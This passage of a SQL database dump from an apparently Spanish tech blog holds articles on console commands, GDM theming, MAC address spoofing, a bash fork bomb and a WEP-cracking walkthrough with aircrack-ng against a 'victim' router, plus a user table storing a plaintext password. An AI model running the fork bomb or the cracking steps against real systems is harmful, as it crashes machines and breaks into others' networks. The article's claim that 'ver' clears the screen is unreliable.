(9, 'Comandos Básicos', 'Comandos Básicos de MSDOS', '	<h4 style="text-align:center;font-size:16px;text-decoration:underline;padding-top:10px;padding-bottom:10px">1. Comandos de sistema</h4>\r\n	<table border="1" style="border-collapse:collapse;width:85%" align="center">\r\n		<tr style="font-size:15px;font-weight:bold;background-color:#B2C629;color:#FFFFFF">\r\n			<td style="padding:4px">Comandos</td>\r\n			<td>Descripción</td>\r\n		</tr>\r\n		<tr>\r\n			<td style="padding:4px"><b>ver</b></td>\r\n			<td>Borra Pantalla</td>\r\n		</tr>\r\n		<tr>\r\n			<td style="padding:4px"><b>vol</b></td>\r\n			<td>Muestra la etiqueta del disco duro y su volumen (si lo tiene).</td>\r\n		</tr>\r\n		<tr>\r\n			<td style="padding:4px"><b>cls</b></td>\r\n			<td>Borrar Pantalla</td>\r\n		</tr>\r\n		<tr>\r\n			<td style="padding:4px"><b>time</b></td>\r\n			<td>Muentra y permite cambiar la hora del sistem</td>\r\n		</tr>\r\n		<tr>\r\n			<td style="padding:4px"><b>date</b></td>\r\n			<td>Muestra y permite cambiar la fecha del sistema</td>\r\n		</tr>\r\n		<tr>\r\n			<td style="padding:4px"><b>type</b> nombre_fichero</td>\r\n			<td>Muestra en pantalla el contenido del fichero</td>\r\n		</tr>\r\n		<tr>\r\n			<td style="padding:4px"><b>del</b> nombre_fichero</td>\r\n			<td>Borra el fichero</td>\r\n		</tr>\r\n		<tr>\r\n			<td style="padding:4px"><b>ren</b> nom_fichero_uno nom_fichero_dos</td>\r\n			<td>Cambia el nombre del fichero nom_fichero_uno a nom_fichero_dos</td>\r\n		</tr>\r\n		<tr>\r\n			<td style="padding:4px"><b>copy</b> <i>[origen]</i>  <i>[destino]</i></td>\r\n			<td>Copia un fichero de origen a destino</td>\r\n		</tr>\r\n		<tr>\r\n			<td style="padding:4px"><b>move</b> <i>[origen]</i> <i>[destino]</i></td>\r\n			<td>Mueve un fichero de origen a destino</td>\r\n		</tr>\r\n		<tr>\r\n			<td style="padding:4px"><b>tree</b></td>\r\n			<td>Muestra los directorios en forma de árbol.</td>\r\n		</tr>\r\n		<tr>\r\n			<td style="padding:4px"><b>dir</b></td>\r\n			<td>Muestra el contenido del directorio</td>\r\n		</tr>\r\n		<tr>\r\n			<td style="padding:4px"><b>attrib</b> <i>[nombre_fichero]</i> <i>[atributo]</i></td>\r\n			<td>Muestra/asigna los atributos de un fichero.Pueden ser:<br />\r\n			De lectura <b>(r)</b>, de escritura <b>(w)</b>, de archivo <b>(a)</b>, oculto <b>(h)</b>, de sistema <b>(s)</b>.\r\n			</td>\r\n		</tr>\r\n	</table>\r\n	\r\n	<h4 style="text-align:center;font-size:16px;text-decoration:underline;padding-top:10px;padding-bottom:10px">2. Comandos de manejo de Directorios</h4>\r\n	<table border="1" style="border-collapse:collapse;width:85%" align="center">\r\n		<tr style="font-size:15px;font-weight:bold;background-color:#B2C629;color:#FFFFFF">\r\n			<td style="padding:4px">Comandos</td>\r\n			<td>Descripción</td>\r\n		</tr>\r\n		<tr>\r\n			<td style="padding:4px"><b>cd</b></td>\r\n			<td>Va a el directorio</td>\r\n		</tr>\r\n		<tr>\r\n			<td style="padding:4px"><b>md</b></td>\r\n			<td>Crea un directorio</td>\r\n		</tr>\r\n		<tr>\r\n			<td style="padding:4px"><b>rd</b></td>\r\n			<td>Borra un directorio</td>\r\n		</tr>\r\n		<tr>\r\n			<td style="padding:4px"><b>cd..</b></td>\r\n			<td>Sale del directorio</td>\r\n		</tr>\r\n	</table>\r\n	\r\n	<p><span style="font-weight:bold;font-size:14px">Caracteres especiales en msdos: </span><br />\r\n		<ul>\r\n			<li><span style="color:red;font-weight:bold">?</span> &raquo; Sustituye un solo caracter.</li>\r\n			<li><span style="color:red;font-weight:bold">*</span> &raquo; Sustituye un cadena de caracteres.</li>\r\n		</ul>\r\n	</p>\r\n	<p>\r\n		En el próximo artículo explicare estos comandos con un ejemplo práctico, para que sea más fácil aprenderlos.\r\n	</p>\r\n	<!-- Publicidad -->\r\n	<div style="width:468px;margin:0 auto">\r\n		<script type="text/javascript"><!--\r\n		google_ad_client = "ca-pub-2969828403799030";\r\n		/* Horizontal mediano */\r\n		google_ad_slot = "5838362340";\r\n		google_ad_width = 468;\r\n		google_ad_height = 15;\r\n		//-->\r\n		</script>\r\n		<script type="text/javascript"\r\n		src="http://pagead2.googlesyndication.com/pagead/show_ads.js">\r\n		</script>\r\n	</div>', 1, '2012-11-04', 0, 4, 6, 'Comandos básicos de MSDOS', 'msdos,comandos básicos de windows'),
(10, 'Apagar Windows desde la consola', 'Como apagar Windows desde consola con el comando <b><i>shutdown</i></b>', '<p><img style="display: block; margin-left: auto; margin-right: auto;" src="archivos/apagado-windows.jpg" alt="apagado-windows.jpg" /></p>\r\n<p>En Windows existe un comando llamado <strong>shutdown</strong> que sirve para apagar en ordenador desde la consola de Windows.<br /><br /> Lo primero es abrir la consola de Windows (<strong>cmd</strong>), para abrir el <strong>cmd</strong> vamos a el buscador de Windows y buscamos <strong>cmd</strong> y una vez abierto podemos a empezar.</p>\r\n<p><strong>Para apagar el ordenador:</strong></p>\r\n<pre class="brush: bash;">shutdown -s</pre>\r\n<p><strong>Para cancelar el apagado del ordenador: </strong></p>\r\n<pre class="brush: bash;">shutdown -a</pre>\r\n<p>Por &uacute;ltimo, el m&aacute;s interesante como apagar Windows en un tiempo determinado:</p>\r\n<pre class="brush: bash;">shutdown -s -t XX</pre>\r\n<p>*donde XX son los minutos, por ejemplo:</p>\r\n<pre class="brush: bash;">shutdown -s -t 3600</pre>\r\n<p>*el ordenador se apagara en una hora y nos saldr&aacute; un mensaje como este:</p>\r\n<p><img style="display: block; margin-left: auto; margin-right: auto;" src="archivos/mensaje-apagado-windows.jpg" alt="mensaje-apagado-windows.jpg" /></p>\r\n<div style="width: 468px; margin: 0 auto;">\r\n<script type="text/javascript">// <![CDATA[\r\ngoogle_ad_client = "ca-pub-2969828403799030";\r\n		/* Horizontal mediano */\r\n		google_ad_slot = "5838362340";\r\n		google_ad_width = 468;\r\n		google_ad_height = 15;\r\n// ]]></script>\r\n<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js">// <![CDATA[\r\n		\r\n// ]]></script>\r\n</div>', 1, '2012-11-05', 0, 4, 6, 'Apagar Windows desde la consola', 'shutdown,apagar windows,programar apagado de Windows'),
(11, 'Cómo personalizar GDM 3.6', '', '<p>Nuestros amigos de <strong>webupd8</strong> nos informan de como personalizar GDM3.</p>\r\n<p><a href="https://github.com/Nano77/gdm3setup">GDM3Setup</a> , una herramienta para modificar el nombre de usuario GDM3 pantalla / bloqueo de la pantalla, se ha actualizado recientemente para apoyar la &uacute;ltima GDM estable 3.6.</p>\r\n<p style="font-weight: bold; font-size: 16px;">GDM3Setup caracter&iacute;sticas:</p>\r\n<ul>\r\n<li>Cambiar el GDM3 GNOME Shell / GTK tema</li>\r\n<li>Activar / desactivar el inicio de sesi&oacute;n autom&aacute;tico</li>\r\n<li>GNOME Shell: logo cambio, mostrar la fecha en el reloj, mostrar segundos en el reloj</li>\r\n<li>GTK: cambiar la fuente, desactive la lista de usuarios, deshabilitar el reinicio botones</li>\r\n<li>Cambio de tema de iconos, fondos de escritorio, temas cursor</li>\r\n</ul>\r\n<p>Algunos temas de GNOME Shell no funcionaba correctamente con GDM, as&iacute; que te sugiero que no cambian el tema GDM GNOME Shell! Adem&aacute;s, un usuario ha informado de que la funci&oacute;n de inicio de sesi&oacute;n autom&aacute;tico provoca problemas.</p>\r\n<p style="font-weight: bold; font-size: 14px;"><a class="fancybox" href="archivos/gdm3.6-login-screen-background.png"><img style="width: 300px; display: block; margin-left: auto; margin-right: auto;" src="archivos/gdm3.6-login-screen-background.png" alt="gdm3.6-login-screen-background.png" /></a></p>\r\n<p style="font-weight: bold; font-size: 14px;"><span style="font-size: medium;"><a href="https://github.com/Nano77/gdm3setup">Descargar GDM3Setup</a></span></p>\r\n<p>GDM3Setup est&aacute; disponible para Ubuntu, Debian, openSUS, Fedora y Arch Linux y se puede descargar desde GitHub:</p>\r\n<p><span style="font-size: 11px;"><strong>Nota:</strong> aunque la p&aacute;gina GDM3Setup dice que el paquete deb de Ubuntu es para Ubuntu Ocelot on&iacute;rico, funciona con Ubuntu 12.10 Quetzal Quantal y la &uacute;ltima GDM 3.6.</span></p>\r\n<p style="font-weight: bold; font-size: 16px;">&iquest;C&oacute;mo cambiar la imagen de fondo GDM 3.6?</p>\r\n<p><a class="fancybox" href="archivos/gdm-3.6-lock-screen3.png"><img style="width: 300px; display: block; margin-left: auto; margin-right: auto;" src="archivos/gdm-3.6-lock-screen3.png" alt="gdm-3.6-lock-screen3.png" /></a></p>\r\n<p><strong>GDM3Setup</strong> permite cambiar el fondo de pantalla GDM 3.6, pero esta opci&oacute;n puede no ser lo que se espera: la opci&oacute;n de cambiar el fondo de pantalla en <strong>GDM3Setup</strong> s&oacute;lo cambia la imagen que aparece justo antes o despu&eacute;s GDM3s y no el fondo gris real utilizado por GDM 3.6 para el inicio de sesi&oacute;n o el bloqueo de pantalla.</p>\r\n<p>Hasta GDM3Setup tiene una opci&oacute;n para esto, puede cambiar manualmente el GDM 3,6 imagen de fondo gris. La imagen utilizada por defecto se encuentra en <strong><em>/ usr / share / gnome-shell / theme /</em></strong> y se llama <strong>noise-texture.png</strong>.</p>\r\n<p>La imagen gris usada por GDM 3.6 es un patr&oacute;n, pero usted puede utilizar una imagen de fondo normal. Para cambiarla, abra Nautilus como root:</p>\r\n<pre class="brush: bash;">gksu "nautilus --no-desktop /usr/share/gnome-shell/theme/"</pre>\r\n<p>a continuaci&oacute;n, realice una copia de seguridad de la imagen original <strong>noise-texture.png</strong> y reemplazarla con la imagen que desea utilizar como fondo para la pantalla de inicio de sesi&oacute;n GDM 3.6.</p>\r\n<div style="width: 468px; margin: 0 auto;">\r\n<script type="text/javascript">// <![CDATA[\r\ngoogle_ad_client = "ca-pub-2969828403799030";\r\n		/* Horizontal mediano */\r\n		google_ad_slot = "5838362340";\r\n		google_ad_width = 468;\r\n		google_ad_height = 15;\r\n// ]]></script>\r\n<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js">// <![CDATA[\r\n\r\n// ]]></script>\r\n</div>', 1, '2012-11-06', 0, 0, 4, 'Cómo personalizar GDM 3.6 (Pantalla de inicio)', 'gdm3,personalizar pantalla gnome'),
(12, 'Cambiar la dirección MAC en Ubuntu ', '', '<p><span style="font-weight: bold; font-size: 15px;">1. Instalamos macchanger<br /></span></p>\r\n<pre class="brush: bash;">sudo apt-get install macchanger</pre>\r\n<p><span style="font-weight: bold; font-size: 15px;">2. Miramos la interfaz de la conexi&oacute;n:<br /></span></p>\r\n<pre class="brush: bash;">iwconfig</pre>\r\n<p><a class="fancybox" href="archivos/cambiar-mac.jpg"><img style="display: block; margin-left: auto; margin-right: auto;" src="archivos/cambiar-mac.jpg" alt="cambiar-mac.jpg" /></a></p>\r\n<p>*En este caso mi interfaz es: wlan0<br /> Mi direccion mac es: <strong>4c:0f:6e:e7:57:22</strong></p>\r\n<p><span style="font-weight: bold; font-size: 15px;">3. Cambiamos la direccion mac</span></p>\r\n<pre class="brush: bash;">sudo ifconfig interfaz down</pre>\r\n<p><a class="fancybox" href="archivos/ifconfig1.jpg"><img style="display: block; margin-left: auto; margin-right: auto;" src="archivos/ifconfig1.jpg" alt="ifconfig1.jpg" /></a></p>\r\n<pre class="brush: bash;">sudo macchanger --mac XX:XX:XX:XX:XX interfaz</pre>\r\n<p><a class="fancybox" href="archivos/cambio-mac2.jpg"><img style="display: block; margin-left: auto; margin-right: auto;" src="archivos/cambio-mac2.jpg" alt="cambio-mac2.jpg" /></a></p>\r\n<pre class="brush: bash;">sudo ifconfig interfaz up</pre>\r\n<p><a class="fancybox" href="archivos/ifconfig2.jpg"><img style="display: block; margin-left: auto; margin-right: auto;" src="archivos/ifconfig2.jpg" alt="ifconfig2.jpg" /></a></p>\r\n<pre class="brush: bash;">sudo ifconfig wlan0</pre>\r\n<p><a class="fancybox" href="archivos/comprobar-mac.jpg"><img style="display: block; margin-left: auto; margin-right: auto;" src="archivos/comprobar-mac.jpg" alt="comprobar-mac.jpg" /></a></p>\r\n<p>Cambio la direcci&oacute;n mac de <strong>4c:0f:6e:e7:57:22</strong> a <strong>00:11:22:33:44:55</strong></p>\r\n<!-- Publicidad -->\r\n<div style="width: 468px; margin: 0 auto;">\r\n<script type="text/javascript">// <![CDATA[\r\ngoogle_ad_client = "ca-pub-2969828403799030";\r\n		/* Horizontal mediano */\r\n		google_ad_slot = "5838362340";\r\n		google_ad_width = 468;\r\n		google_ad_height = 15;\r\n// ]]></script>\r\n<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js">// <![CDATA[\r\n\r\n// ]]></script>\r\n</div>', 1, '2012-11-06', 0, 1, 3, 'Cambiar la dirección MAC en Ubuntu ', 'cambiar mac en ubuntu,cambiar mac'),
(13, 'Comando peligroso', '', '<p><span style="font-size: 14px; font-weight: bold;">Descripci&oacute;n del comando:</span><br /> Esta combinaci&oacute;n de caracteres desencadena un ciclo ad infinitum de ejecuci&oacute;n de programas/procesos que inevitablemente terminan por saturar la memoria de la computadora, haciendo colapsar el sistema. Estas creaciones conocidas como &ldquo;bombas l&oacute;gicas&rdquo; son ampliamente utilizadas por hackers en diversos sistemas operativos como Windows o Unix. La &ldquo;bomba&rdquo; creada por jaromil es considerada, por lejos, con sus 13 caracteres y su aspecto inofensivo, la m&aacute;s breve y elegante de todas las conocidas hasta el momento.</p>\r\n<p>El comando ser&iacute;a este:</p>\r\n<pre class="brush: bash;">: (){ : | :&amp; };:</pre>\r\n<p>Este comando lo encontre en el libro:</p>\r\n<p style="text-align: center;"><a href="http://www.etnassoft.com/biblioteca/internet-hackers-y-software-libre/"><strong>Internet, Hacker y Software Libre</strong> de CarlosGradin, Editora Fantasma</a></p>\r\n<div style="width: 468px; margin: 0 auto;">\r\n<script type="text/javascript">// <![CDATA[\r\ngoogle_ad_client = "ca-pub-2969828403799030";\r\n		/* Horizontal mediano */\r\n		google_ad_slot = "5838362340";\r\n		google_ad_width = 468;\r\n		google_ad_height = 15;\r\n// ]]></script>\r\n<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js">// <![CDATA[\r\n		\r\n// ]]></script>\r\n</div>', 1, '2012-11-06', 0, 0, 4, 'Bomba lógica para Linux, Windows, Mac.', 'bomba lógica,comandos peligroso'),
(14, 'Seguridad Wifi', '', '<p>La distribuci&oacute;n que voy a usar para la auditoria es wifiway,el enlace de descarga aqui</p>\r\n<p>Lo primero que tenemos que hacer es abrir una terminal y teclear:</p>\r\n<pre class="brush: ps;">airmon-ng</pre>\r\n<p><a class="fancybox" href="archivos/auditoria-de-red-wep_001.png"><img style="display: block; margin-left: auto; margin-right: auto;" src="archivos/auditoria-de-red-wep_001.png" alt="auditoria-de-red-wep_001.png" /></a> <br />Esto nos sirver para conocer el nombre de nuestra interfaz, en mi caso en wlan0</p>\r\n<p>Ahora lo que tenemos que hacer es poner nuestra interfaz en modo monitor, para ello teclearmos</p>\r\n<pre class="brush: ps;">airmon-ng start wlan0</pre>\r\n<p><a class="fancybox" href="archivos/auditoria-de-red-wep_002.png"><img style="display: block; margin-left: auto; margin-right: auto;" src="archivos/auditoria-de-red-wep_002.png" alt="auditoria-de-red-wep_002.png" /></a></p>\r\n<p>Para comprobar que est&aacute; en modo monitor volvemos a teclear:</p>\r\n<pre class="brush: ps;">airmon-ng</pre>\r\n<p><a class="fancybox" href="archivos/auditoria-de-red-wep_003.png"><img style="display: block; margin-left: auto; margin-right: auto;" src="archivos/auditoria-de-red-wep_003.png" alt="auditoria-de-red-wep_003.png" /></a></p>\r\n<p>ahora vamos a escanear las redes disponibles para obtener informaci&oacute;n de nuestro objetivo</p>\r\n<pre class="brush: ps;">airodump-ng</pre>\r\n<p><a class="fancybox" href="archivos/auditoria-de-red-wep_004.png"><img style="width: 650px; display: block; margin-left: auto; margin-right: auto;" src="archivos/auditoria-de-red-wep_004.png" alt="auditoria-de-red-wep_004.png" /></a> <br />Para parar el escaneo le damos a control c.</p>\r\n<p>Para el siguiente paso debemos tener claro que es el BSSID,CHANNEL y los DATA.</p>\r\n<ul>\r\n<li><span>BSSID: </span>Significa Basic Service Set Identifier y se trata de la direcci&oacute;n MAC (f&iacute;sica) del Access Point (router) al que nos conectamos.</li>\r\n<li><span>CHANNEL: </span>es el canal de la red inalambrica</li>\r\n<li><span>DATA: es el numero de paquetes capturados</span></li>\r\n</ul>\r\n<p>Lo siguiente que tenemos que hacer es:</p>\r\n<pre class="brush: ps;">airodump-ng -w red -c 6 --bssid 00:19:15:B8:81:EE mon0</pre>\r\n<ul>\r\n<li><span>-w:</span> es donde se van a guardar todos los paquetes capturados</li>\r\n<li><span>-c:</span> es el canal de la red</li>\r\n<li><span>--bssid:</span> es la direcci&oacute;n fisica del router</li>\r\n<li><span>mon0</span> es nuestra interfaz en modo monitor</li>\r\n</ul>\r\n<p><a class="fancybox" href="archivos/auditoria-de-red-wep_005.png"><img style="width: 650px; display: block; margin-left: auto; margin-right: auto;" src="archivos/auditoria-de-red-wep_005.png" alt="auditoria-de-red-wep_005.png" /></a></p>\r\n<p>Abrimos una nueva ventana:</p>\r\n<pre class="brush: bash;">aireplay-ng -1 0 -a 00:19:15:B8:81:EE mon0</pre>\r\n<p>*La direcci&oacute;n mac de nuestra victima.<br /> <a class="fancybox" href="archivos/auditoria-de-red-wep_006.png"><img src="archivos/auditoria-de-red-wep_006.png" alt="auditoria-de-red-wep_006.png" /></a> <br />Lo que hacemos con este paso en autentificarnos de manera falsa,sino se logra esto no se va a poner acceder al siguiente paso.</p>\r\n<p>Abrimos una nueva ventana:</p>\r\n<pre class="brush: bash;">aireplay-ng -3 -b 00:19:15:B8:81:EE mon0</pre>\r\n<p><a class="fancybox" href="archivos/auditoria-de-red-wep_008.png"><img style="width: 650px; display: block; margin-left: auto; margin-right: auto;" src="archivos/auditoria-de-red-wep_008.png" alt="auditoria-de-red-wep_008.png" /></a> <br />Con esto empieza a enviar y a recibir paquetes, con esto los DATA se incrementan rapidamente.</p>\r\n<p>Tenemos que esperar a tener por lo menos 30.000 o 40.000 DATAS(paquetes). Cuando tengamos esa cifra, abrimos otra terminal y tecleamos:</p>\r\n<pre class="brush: bash;">aircrack-ng claves-01.cap</pre>\r\n<p><a class="fancybox" href="archivos/auditoria-de-red-wep_009.png"><img style="width: 650px; display: block; margin-left: auto; margin-right: auto;" src="archivos/auditoria-de-red-wep_009.png" alt="auditoria-de-red-wep_009.png" /></a></p>\r\n<!-- Publicidad -->\r\n<div style="width: 468px; margin: 0 auto;">\r\n<script type="text/javascript">// <![CDATA[\r\ngoogle_ad_client = "ca-pub-2969828403799030";\r\n		/* Horizontal mediano */\r\n		google_ad_slot = "5838362340";\r\n		google_ad_width = 468;\r\n		google_ad_height = 15;\r\n// ]]></script>\r\n<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js">// <![CDATA[\r\n\r\n// ]]></script>\r\n</div>', 1, '2012-11-08', 0, 1, 3, '', '');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `po_enlace`
--

CREATE TABLE IF NOT EXISTS `po_enlace` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `titulo` varchar(100) NOT NULL,
  `ruta` varchar(255) NOT NULL,
  `idseccion` int(11) NOT NULL DEFAULT '0',
  `idquien` int(10) unsigned NOT NULL,
  `orden` int(10) unsigned NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=7 ;

--
-- Volcado de datos para la tabla `po_enlace`
--

INSERT INTO `po_enlace` (`id`, `titulo`, `ruta`, `idseccion`, `idquien`, `orden`) VALUES
(1, 'Aupate', 'www.aupate.com', 2, 0, 1),
(2, 'Ubuntu León', 'www.ubuntuleon.com', 2, 0, 2),
(3, 'Planet Ubuntu', 'www.planetubuntu.es', 2, 0, 3),
(4, 'Raspberry Pi', 'www.raspberrypi.org/', 0, 1, 1),
(5, 'webupd8', 'www.webupd8.org/2012/11/how-to-customize-gdm-36-login-lock.html#more', 1, 11, 0),
(6, 'etnassoft', 'www.etnassoft.com/biblioteca/internet-hackers-y-software-libre/', 1, 13, 0);

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `po_seccion`
--

CREATE TABLE IF NOT EXISTS `po_seccion` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `nom` varchar(150) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=3 ;

--
-- Volcado de datos para la tabla `po_seccion`
--

INSERT INTO `po_seccion` (`id`, `nom`) VALUES
(1, 'Noticia'),
(2, 'inicio');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `po_subcategoria`
--

CREATE TABLE IF NOT EXISTS `po_subcategoria` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `nom` varchar(100) NOT NULL,
  `descripcion` text NOT NULL,
  `imagen` varchar(200) NOT NULL,
  `orden` int(10) unsigned NOT NULL,
  `idcategoria` int(10) unsigned NOT NULL,
  `description` text NOT NULL,
  `keywords` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=5 ;

--
-- Volcado de datos para la tabla `po_subcategoria`
--

INSERT INTO `po_subcategoria` (`id`, `nom`, `descripcion`, `imagen`, `orden`, `idcategoria`, `description`, `keywords`) VALUES
(1, 'Consola', 'Con la terminal o con la consola se puede hacer de todo desde instalar un paquete o crear una carpeta, etc', 'terminal.jpg', 1, 3, 'La terminal es una forma de acceder al sistema sin utilizar la interfaz gráfica, te enseñamos como usarla.', 'terminal linux,consola,comandos,shell'),
(2, 'HTML', 'HTML, siglas de HyperText Markup Language («lenguaje de marcado de hipertexto»), hace referencia al lenguaje de marcado predominante para la elaboración de páginas web que se utiliza para describir y traducir la estructura y la información en forma de texto.', 'html.jpg', 2, 2, 'Manual desde cero de html', 'html,crear web con html,etiquetas html'),
(3, 'PHP', 'PHP es un lenguaje de programación de uso general de script del lado del servidor originalmente diseñado para el desarrollo web de contenido dinámico.', 'php.jpg', 2, 2, 'Manual de php desde cero', 'manual de php,aprender php desde cero,lenguaje de servidor'),
(4, 'MSDOS', 'MS-DOS es un sistema operativo para computadoras basados en x86. Fue el miembro más popular de la familia de sistemas operativos DOS de Microsoft', 'msdos.png', 0, 6, 'Manual de msdos para Windows.', 'msdos,comandos windows,consola windows');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `po_usuario`
--

CREATE TABLE IF NOT EXISTS `po_usuario` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `login` varchar(200) NOT NULL,
  `clave` varchar(200) NOT NULL,
  `nom` varchar(100) NOT NULL,
  `ape` varchar(250) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- Volcado de datos para la tabla `po_usuario`
--

INSERT INTO `po_usuario` (`id`, `login`, `clave`, `nom`, `ape`) VALUES
(1, 'rubenppg', '5805', 'Rubén', 'González Juan');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `po_video`
--

CREATE TABLE IF NOT EXISTS `po_video` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `nom` varchar(100) NOT NULL,
  `ruta` varchar(50) NOT NULL,
  `orden` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=34 ;

--
-- Volcado de datos para la tabla `po_video`
--

INSERT INTO `po_video` (`id`, `nom`, `ruta`, `orden`) VALUES
(33, 'Instalación de Ubuntu 10.04 desde 0', 'OkOuMSsZTsg', 0);

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
